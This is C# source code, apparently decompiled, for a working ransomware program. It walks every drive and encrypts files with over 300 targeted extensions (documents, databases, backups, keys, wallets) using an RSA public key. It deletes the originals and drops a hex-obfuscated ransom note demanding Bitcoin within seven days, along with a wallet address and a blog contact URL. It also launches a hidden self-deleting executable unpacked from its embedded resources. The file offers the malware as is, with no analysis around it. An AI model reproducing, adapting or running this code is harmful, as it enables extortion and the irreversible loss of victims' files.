using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SAM;

internal class Program
{
	private static string[] types = new string[328]
	{
		"xls", ".xlsx", ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".txt", ".dwg", ".bak",
		".bkf", ".pst", ".dbx", ".zip", ".rar", ".mdb", ".asp", ".aspx", ".html", ".htm",
		".dbf", ".3dm", ".3ds", ".3fr", ".jar", ".3g2", ".xml", ".png", ".tif", ".3gp",
		".java", ".jpe", ".jpeg", ".jpg", ".jsp", ".php", ".3pr", ".7z", ".ab4", ".accdb",
		".accde", ".accdr", ".accdt", ".ach", ".kbx", ".acr", ".act", ".adb", ".ads", ".agdl",
		".ai", ".ait", ".al", ".apj", ".arw", ".asf", ".asm", ".asx", ".avi", ".awg",
		".back", ".backup", ".backupdb", ".pbl", ".bank", ".bay", ".bdb", ".bgt", ".bik", ".bkp",
		".blend", ".bpw", ".c", ".cdf", ".cdr", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".cdx", ".ce1", ".ce2", ".cer", ".cfp", ".cgm", ".cib", ".class", ".cls", ".cmt",
		".cpi", ".cpp", ".cr2", ".craw", ".crt", ".crw", ".phtml", ".php5", ".cs", ".csh",
		".csl", ".tib", ".csv", ".dac", ".db", ".db3", ".db-journal", ".dc2", ".dcr", ".dcs",
		".ddd", ".ddoc", ".ddrw", ".dds", ".der", ".des", ".design", ".dgc", ".djvu", ".dng",
		".dot", ".docm", ".dotm", ".dotx", ".drf", ".drw", ".dtd", ".dxb", ".dxf", ".dxg",
		".eml", ".eps", ".erbsql", ".erf", ".exf", ".fdb", ".ffd", ".fff", ".fh", ".fmb",
		".fhd", ".fla", ".flac", ".flv", ".fpx", ".fxg", ".gray", ".grey", ".gry", ".h",
		".hbk", ".hpp", ".ibank", ".ibd", ".ibz", ".idx", ".iif", ".iiq", ".incpas", ".indd",
		".kc2", ".kdbx", ".kdc", ".key", ".kpdx", ".lua", ".m", ".m4v", ".max", ".mdc",
		".mdf", ".mef", ".mfw", ".mmw", ".moneywell", ".mos", ".mov", ".mp3", ".mp4", ".mpg",
		".mrw", ".msg", ".myd", ".nd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2",
		".ns3", ".ns4", ".nsd", ".nsf", ".nsg", ".nsh", ".nwb", ".nx2", ".nxl", ".nyf",
		".oab", ".obj", ".odb", ".odc", ".odf", ".odg", ".odm", ".odp", ".ods", ".odt",
		".oil", ".orf", ".ost", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12", ".p7b",
		".p7c", ".pab", ".pages", ".pas", ".pat", ".pcd", ".pct", ".pdb", ".pdd", ".pef",
		".pem", ".pfx", ".pl", ".plc", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm",
		".ppsx", ".pptm", ".prf", ".ps", ".psafe3", ".psd", ".pspimage", ".ptx", ".py", ".qba",
		".qbb", ".qbm", ".qbr", ".qbw", ".qbx", ".qby", ".r3d", ".raf", ".rat", ".raw",
		".rdb", ".rm", ".rtf", ".rw2", ".rwl", ".rwz", ".s3db", ".sas7bdat", ".say", ".sd0",
		".sda", ".sdf", ".sldm", ".sldx", ".sql", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srt", ".srw", ".st4", ".st5", ".st6", ".st7", ".st8", ".std", ".sti", ".stw",
		".stx", ".svg", ".swf", ".sxc", ".sxd", ".sxg", ".sxi", ".sxi", ".sxm", ".sxw",
		".tex", ".tga", ".thm", ".tlg", ".vob", ".war", ".wallet", ".wav", ".wb2", ".wmv",
		".wpd", ".wps", ".x11", ".x3f", ".xis", ".xla", ".xlam", ".xlk", ".xlm", ".xlr",
		".xlsb", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".ycbcra", ".yuv"
	};

	private static List<string> mylist250 = new List<string>();

	private static List<string> mylist500 = new List<string>();

	private static List<string> mylist1000 = new List<string>();

	private static List<string> mylistbig = new List<string>();

	private static List<string> openfiles = new List<string>();

	private static string comname = ToHexString(Environment.MachineName);

	private static string publickey = "";

	private static string currentdir = Directory.GetCurrentDirectory();

	private static string helpfile = "HELP_DECRYPT_YOUR_FILES";

	private static string helpfileext = ".html";

	private static string sfd = currentdir + "\\selfdel.exe";

	private static string ext_enc = ".encryptedRSA";

	private static string yourweb = "680074007400700073003A002F002F0070006100790066006F00720073006500630075007200650037002E0077006F0072006400700072006500730073002E0063006F006D00";

	private static string yourbtc = "31004A006E0078004C0052005100530048006B0043007700350061004500680075003500560051007000740055007100340058006D0078006E007400410076004C003200";

	private static string txthelp = "3C002F00680074006D006C003E000D000A003C007000720065003E000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230057006800610074002000680061007000700065006E0065006400200074006F00200079006F00750072002000660069006C00650073003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0041006C006C0020006F006600200079006F0075007200200069006D0070006F007200740061006E0074002000660069006C0065007300200065006E0063007200790070007400650064002000770069007400680020005200530041002D0032003000340038002C0020005200530041002D00320030003400380020006900730020006100200070006F00770065007200660075006C002000630072007900700074006F00670072006100700068007900200061006C0067006F0072006900740068006D000D000A0046006F00720020006D006F0072006500200069006E0066006F0072006D006100740069006F006E00200079006F0075002000630061006E0020007500730065002000570069006B006900700065006400690061000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E0061007400740065006E00740069006F006E003A00200044006F006E00270074002000720065006E0061006D00650020006F00720020006500640069007400200065006E0063007200790070007400650064002000660069006C0065007300200062006500630061007500730065002000690074002000770069006C006C00200062006500200069006D0070006F0073007300690062006C006500200074006F0020006400650063007200790070007400200079006F00750072002000660069006C00650073000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230048006F007700200074006F0020007200650063006F007600650072002000660069006C00650073003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A005200530041002000690073002000610020006100730079006D006D00650074007200690063002000630072007900700074006F006700720061007000680069006300200061006C0067006F0072006900740068006D002C00200059006F00750020006E006500650064002000740077006F0020006B00650079000D000A000D000A0031002D005000750062006C006900630020006B00650079003A00200079006F00750020006E00650065006400200069007400200066006F007200200065006E006300720079007000740069006F006E000D000A0032002D00500072006900760061007400650020004B00650079003A00200079006F00750020006E00650065006400200069007400200066006F0072002000640065006300720079007000740069006F006E000D000A000D000A0053006F00200079006F00750020006E006500650064002000500072006900760061007400650020006B0065007900200074006F0020007200650063006F00760065007200200079006F00750072002000660069006C00650073002E000D000A00490074002700730020006E006F007400200070006F0073007300690062006C006500200074006F0020007200650063006F00760065007200200079006F00750072002000660069006C0065007300200077006900740068006F00750074002000700072006900760061007400650020006B00650079000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230048006F007700200074006F0020006700650074002000700072006900760061007400650020006B00650079003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0059006F0075002000630061006E0020007200650063006500690076006500200079006F00750072002000500072006900760061007400650020004B0065007900200069006E0020003300200065006100730079002000730074006500700073003A000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D00220072006500640022003E00530074006500700031003A003C002F0066006F006E0074003E00200059006F00750020006D007500730074002000730065006E00640020007500730020004F006E00650020004200690074006F00630069006E00200066006F00720020006500610063006800200061006600660065006300740065006400200050004300200074006F00200072006500630065006900760065002000500072006900760061007400650020004B00650079002E000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D00220072006500640022003E00530074006500700032003A003C002F0066006F006E0074003E00200041006600740065007200200079006F0075002000730065006E00640020007500730020006F006E006500200042006900740063006F0069006E002C0020004C00650061007600650020006100200063006F006D006D0065006E00740020006F006E0020006F0075007200200062006C006F006700200077006900740068002000740068006500730065002000640065007400610069006C003A00200059006F0075007200200042006900740063006F0069006E0020007400720061006E00730061006300740069006F006E0020007200650066006500720065006E006300650020002B00200059006F0075007200200043006F006D007000750074006500720020006E0061006D0065000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E0059006F0075007200200043006F006D007000750074006500720020006E0061006D0065002000690073003A00" + comname + "3C00620072003E003C00620072003E003C0066006F006E007400200063006F006C006F0072003D00220072006500640022003E00530074006500700033003A003C002F0066006F006E0074003E002000570065002000770069006C006C0020007200650070006C007900200074006F00200079006F0075007200200063006F006D006D0065006E00740020007700690074006800200061002000640065006300720079007000740069006F006E00200073006F006600740077006100720065002C00200059006F0075002000730068006F0075006C0064002000720075006E0020006900740020006F006E00200079006F0075007200200061006600660065006300740065006400200050004300200061006E006400200061006C006C00200065006E0063007200790070007400650064002000660069006C00650073002000770069006C006C0020006200650020007200650063006F00760065007200650064000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E004F0075007200200062006C006F006700200061006400640072006500730073003A0020003C006100200068007200650066003D002200" + yourweb + "22003E00" + yourweb + "3C002F0061003E000D000A000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E004F0075007200200042006900740063006F0069006E00200061006400640072006500730073003A002000" + yourbtc + "0D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E0023005700680061007400200069007300200042006900740063006F0069006E003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0042006900740063006F0069006E00200069007300200061006E00200069006E006E006F0076006100740069007600650020007000610079006D0065006E00740020006E006500740077006F0072006B00200061006E0064002000610020006E006500770020006B0069006E00640020006F00660020006D006F006E00650079002E000D000A0059006F0075002000630061006E00200063007200650061007400650020006100200042006900740063006F0069006E0020006100630063006F0075006E0074002000610074002000680074007400700073003A002F002F0062006C006F0063006B0063006800610069006E002E0069006E0066006F002F00200061006E00640020006400650070006F00730069007400200073006F006D00650020006D006F006E0065007900200069006E0074006F00200079006F007500720020006100630063006F0075006E007400200061006E00640020007400680065006E002000730065006E006400200074006F002000750073000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230048006F007700200074006F002000620075007900200042006900740063006F0069006E003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0054006800650072006500200061007200650020006D0061006E0079002000770061007900200074006F002000620075007900200042006900740063006F0069006E00200061006E00640020006400650070006F00730069007400200069007400200069006E0074006F00200079006F007500720020006100630063006F0075006E0074002C0020000D000A0059006F0075002000630061006E0020006200750079002000690074002000770069007400680020005700650073007400650072006E0055006E0069006F006E002C002000420061006E006B00200057006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000420061006E006B0020007400720061006E0073006600650072002C002000430061007300680020006400650070006F00730069007400200061006E00640020006500740063000D000A000D000A00680074007400700073003A002F002F006C006F00630061006C0062006900740063006F0069006E0073002E0063006F006D0020002D002D002D003E002000420075007900200042006900740063006F0069006E002000770069007400680020005700650073007400650072006E0055006E0069006F006E0020006F00720020004D006F006E00650079004700720061006D000D000A000D000A00680074007400700073003A002F002F0063006F0069006E0063006100660065002E0063006F006D002F0062007500790062006900740063006F0069006E0073007700650073007400650072006E002E0070006800700020002D002D002D003E002000420075007900200042006900740063006F0069006E0020006600610073007400200061006E00640020005300650063007500720065002000770069007400680020005700650073007400650072006E0055006E0069006F006E00200061006E0064002000430061007300680020006400650070006F007300690074000D000A000D000A00680074007400700073003A002F002F007700770077002E006200690074007300740061006D0070002E006E006500740020002D002D002D003E002000420075007900200042006900740063006F0069006E00200077006900740068002000620061006E006B00200077006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000620061006E006B0020007400720061006E0073006600650072002C002000530045005000410020007000610079006D0065006E0074000D000A000D000A00680074007400700073003A002F002F007700770077002E006B00720061006B0065006E002E0063006F006D0020002D002D002D003E002000420075007900200042006900740063006F0069006E00200077006900740068002000620061006E006B00200077006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000620061006E006B0020007400720061006E0073006600650072002C002000530045005000410020007000610079006D0065006E0074000D000A000D000A00680074007400700073003A002F002F007700770077002E006B00720061006B0065006E002E0063006F006D0020002D002D002D003E002000420075007900200042006900740063006F0069006E00200077006900740068002000620061006E006B00200077006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000620061006E006B0020007400720061006E0073006600650072002C002000530045005000410020007000610079006D0065006E0074000D000A000D000A00680074007400700073003A002F002F007700770077002E0063006300650064006B002E0063006F006D0020002D002D002D003E002000420075007900200042006900740063006F0069006E00200077006900740068002000620061006E006B00200077006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000620061006E006B0020007400720061006E0073006600650072002C002000530045005000410020007000610079006D0065006E0074000D000A000D000A00680074007400700073003A002F002F00620069007400630075007200650078002E0063006F006D002F0020002D002D002D003E002000420075007900200042006900740063006F0069006E00200077006900740068002000620061006E006B00200077006900720065002C00200049006E007400650072006E006100740069006F006E0061006C002000620061006E006B0020007400720061006E0073006600650072002C002000530045005000410020007000610079006D0065006E0074000D000A000D000A0049006600200079006F0075002000770061006E007400200074006F00200070006100790020007700690074006800200079006F0075007200200042007500730069006E006500730073002000620061006E006B0020006100630063006F0075006E007400200079006F0075002000730068006F0075006C006400200063007200650061007400650020006100200062007500730069006E0065007300730020006100630063006F0075006E007400200069006E002000650078006300680061006E00670065007200730020000D000A007400680065007900200064006F006E0027007400200061006300630065007000740020007000610079006D0065006E0074002000660072006F006D002000740068006900720064002000700061007200740079000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E0048006F007700200074006F002000660069006E0064002000740068006500200042006900740063006F0069006E0020007400720061006E00730061006300740069006F006E0020007200650066006500720065006E00630065003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A004C006F00670069006E00200069006E0074006F00200079006F0075007200200062006C006F0063006B0063006800610069006E0020006100630063006F0075006E00740020002D003E00200067006F00200074006F00200022004D00790020007400720061006E00730061006300740069006F006E002200200074006100620020002D003E00200043006C00690063006B0020006F006E00200079006F007500720020007400720061006E00730061006300740069006F006E0020002D003E00200049006E00200022005400720061006E00730061006300740069006F006E002000530075006D006D006100720079002200200070006100670065002C00200059006F0075002000770069006C006C002000660069006E006400200061002000220068006100730068002200200077006900740068002000360034002000630068006100720061006300740065007200730020006C006F006E0067000D000A00530065006E006400200075007300200074006800690073002000680061007300680020007700690074006800200079006F0075007200200063006F006D006D0065006E00740020006F006E0020006F0075007200200062006C006F00670020002B00200079006F0075007200200063006F006D007000750074006500720020006E0061006D0065000D000A003C0066006F006E007400200063006F006C006F0072003D0022004400720061006B0052006500640022003E002A003C002F0066006F006E0074003E0059006F0075007200200043006F006D007000750074006500720020006E0061006D0065002000690073003A00" + comname + "0D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230048006F007700200074006F0020007500730065002000700072006900760061007400650020004B00650079003F003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A00570065002000730065006E006400200079006F007500200061002000730069006D0070006C006500200073006F0066007400770061007200650020007700690074006800200079006F00750072002000700072006900760061007400650020004B006500790020000D000A0041006E006400200079006F00750020006A0075007300740020006E006500650064002000720075006E0020007400680069007300200073006F0066007400770061007200650020006F006E0020006500610063006800200063006F006D007000750074006500720020007400680061007400200065006E006300720079007000740065006400200061006E006400200061006C006C002000610066006600650063007400650064002000660069006C00650073002000770069006C006C0020006200650020006400650063007200790070007400650064000D000A000D000A003C0066006F006E007400200063006F006C006F0072003D0022004D00610072006F006F006E0022003E003C00630065006E007400650072003E003C00680033003E00230064006500610064006C0069006E0065003C002F00680033003E003C002F00630065006E007400650072003E003C002F0066006F006E0074003E000D000A000D000A0059006F00750020006A00750073007400200068006100760065002000370020006400610079007300200074006F002000730065006E0064002000750073002000740068006500200042006900740063006F0069006E0020006100660074006500720020003700200064006100790073002000770065002000770069006C006C002000720065006D006F0076006500200079006F00750072002000700072006900760061007400650020006B0065007900200061006E00640020006900740027007300200069006D0070006F0073007300690062006C006500200074006F0020007200650063006F00760065007200200079006F00750072002000660069006C00650073000D000A003C002F007000720065003E000D000A003C002F00680074006D006C003E00";

	private static string sysdir = Path.GetPathRoot(Environment.SystemDirectory);

	private static void Main(string[] args)
	{
		if (args.Length != 1)
		{
			return;
		}
		if (!string.IsNullOrEmpty(args[0]))
		{
			publickey = File.ReadAllText(args[0]);
		}
		create_from_resource();
		Thread.Sleep(1000);
		Thread thread = new Thread(sld);
		thread.Start();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady)
				{
					recursivegetfiles(driveInfo.Name);
				}
			}
			catch
			{
			}
		}
		if (mylist250.Count > 0)
		{
			foreach (string item in mylist250)
			{
				try
				{
					myeenncc(item);
				}
				catch
				{
				}
			}
			mylist250.Clear();
		}
		if (mylist500.Count > 0)
		{
			foreach (string item2 in mylist500)
			{
				try
				{
					myeenncc(item2);
				}
				catch
				{
				}
			}
			mylist500.Clear();
		}
		if (mylist1000.Count > 0)
		{
			foreach (string item3 in mylist1000)
			{
				try
				{
					myeenncc(item3);
				}
				catch
				{
				}
			}
		}
		if (mylistbig.Count > 0)
		{
			foreach (string item4 in mylistbig)
			{
				try
				{
					myeenncc(item4);
				}
				catch
				{
				}
			}
		}
		create_desk_file();
	}

	public static void myeenncc(string pathfile)
	{
		FileInfo fileInfo = new FileInfo(pathfile);
		try
		{
			DriveInfo driveInfo = new DriveInfo(pathfile);
			long availableFreeSpace = driveInfo.AvailableFreeSpace;
			long length = fileInfo.Length;
			if (length >= availableFreeSpace || new FileInfo(pathfile).Length <= 0L || File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc) || string.IsNullOrEmpty(publickey))
			{
				return;
			}
			encryptFile(pathfile, publickey);
			if (!File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
			{
				return;
			}
			FileInfo fileInfo2 = new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
			if (fileInfo2.Length > length)
			{
				fileInfo.Attributes = FileAttributes.Normal;
				File.Delete(pathfile);
				if (!File.Exists(pathfile))
				{
					File.WriteAllText(fileInfo.DirectoryName + "\\" + helpfile + helpfileext, FromHexString(txthelp));
				}
			}
		}
		catch (Exception)
		{
			if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
			{
				File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
			}
		}
	}

	public static bool islocked(string FileName)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(FileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(FileName, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	public static string MakePath(string plainFilePath, string newSuffix)
	{
		string path = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
		return Path.Combine(Path.GetDirectoryName(plainFilePath), path);
	}

	public static string encryptFile(string plainFilePath, string publicKeyPath)
	{
		FileInfo fileInfo = new FileInfo(plainFilePath);
		string encryptedFilePath = MakePath(plainFilePath, fileInfo.Extension + ext_enc);
		string manifestFilePath = MakePath(plainFilePath, ".manifest.xml");
		return encc.Encrypt(plainFilePath, encryptedFilePath, manifestFilePath, publicKeyPath);
	}

	public static bool isValidFilePath(string strFilePath)
	{
		bool result = false;
		try
		{
			if (File.Exists(strFilePath))
			{
				result = true;
				return result;
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static string ppee(string ff, string aaa)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(ff, aaa);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace!.ToString();
		}
	}

	public static void sld()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(sfd);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	public static void recursivegetfiles(string path)
	{
		try
		{
			if (!(path != sysdir + "Windows") || path.Contains("Reference Assemblies\\Microsoft") || path.Contains("Recycle.Bin"))
			{
				return;
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles();
			string ext;
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					ext = Path.GetExtension(fileInfo.FullName);
					long length = fileInfo.Length;
					if (!Array.Exists(types, (string element) => element == ext.ToLower()))
					{
						continue;
					}
					if (length <= 104857600L)
					{
						try
						{
							myeenncc(fileInfo.FullName);
						}
						catch
						{
						}
					}
					else if (104857600L < length && length <= 262144000L)
					{
						mylist250.Add(fileInfo.FullName);
					}
					else if (262144000L < length && length <= 524288000L)
					{
						mylist500.Add(fileInfo.FullName);
					}
					else if (524288000L < length && length <= 1048576000L)
					{
						mylist1000.Add(fileInfo.FullName);
					}
					else
					{
						mylistbig.Add(fileInfo.FullName);
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					recursivegetfiles(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void create_from_resource()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			string[] array2 = text.Split(new char[1] { '.' });
			if (array2[2] == "exe")
			{
				if (File.Exists(currentdir + "\\" + array2[1] + "." + array2[2]))
				{
					File.Delete(currentdir + "\\" + array2[1] + "." + array2[2]);
				}
				FileStream fileStream = new FileStream(currentdir + "\\" + array2[1] + "." + array2[2], FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
				byte[] buffer = new byte[4096];
				int count;
				while ((count = manifestResourceStream.Read(buffer, 0, 4096)) > 0)
				{
					fileStream.Write(buffer, 0, count);
				}
				fileStream.Close();
				manifestResourceStream.Close();
			}
		}
	}

	public static void create_desk_file()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
		DirectoryInfo parent = Directory.GetParent(environmentVariable);
		string[] directories = Directory.GetDirectories(parent.FullName);
		string[] array = directories;
		foreach (string text in array)
		{
			if (!Directory.Exists(text + "\\Desktop"))
			{
				continue;
			}
			try
			{
				for (int j = 0; j < 10; j++)
				{
					File.WriteAllText(text + "\\Desktop\\" + helpfile + "_" + j + helpfileext, FromHexString(txthelp));
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string ToHexString(string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		byte[] bytes = Encoding.Unicode.GetBytes(str);
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	public static string FromHexString(string hexString)
	{
		byte[] array = new byte[hexString.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
		}
		return Encoding.Unicode.GetString(array);
	}
}
